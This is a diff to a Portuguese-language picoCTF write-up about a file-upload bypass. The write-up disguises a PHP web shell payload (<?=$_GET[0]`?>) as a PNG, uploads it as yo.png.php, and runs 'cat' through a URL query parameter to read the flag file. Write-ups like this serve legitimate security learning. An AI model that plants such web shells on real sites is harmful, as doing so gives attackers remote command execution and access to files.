@@ -33,10 +33,12 @@ Criamos um arquivo base.png, abrimos em um editor hexadecimal e inserimos os byt
 
 ![image](https://github.com/user-attachments/assets/192391de-0113-44a6-ab5e-cec08305a643)
 
-No final do arquivo, adicionamos a payload PHP (<?=\$_GET[0]`?>`).
+No final do arquivo, adicionamos a payload PHP ```(<?=\$_GET[0]`?>`)```.
 Renomeamos para yo.png.php e fizemos o upload novamente.
 
 ![image](https://github.com/user-attachments/assets/5fc90973-f63b-44b4-93d2-7496179895dc)
+
+![image](https://github.com/user-attachments/assets/c443c4ff-015d-44cc-b707-d0aad97d8398)
 
 Testamos diretórios comuns (/uploads/, /files/, /images/) e encontramos nosso arquivo em:
 
@@ -71,9 +73,6 @@ http://atlas.picoctf.net:62573/uploads/yo.png.php?0=cat%20../GQ4DOOBVMMYGK.txt
 5
 ![image](https://github.com/user-attachments/assets/23009445-c52c-47c7-a126-8084b6efd24d)
 
-
-7
-![image](https://github.com/user-attachments/assets/c443c4ff-015d-44cc-b707-d0aad97d8398)
 
 8
 ![image](https://github.com/user-attachments/assets/f448d0dc-aa4d-44c9-a156-20f23310f1b9)
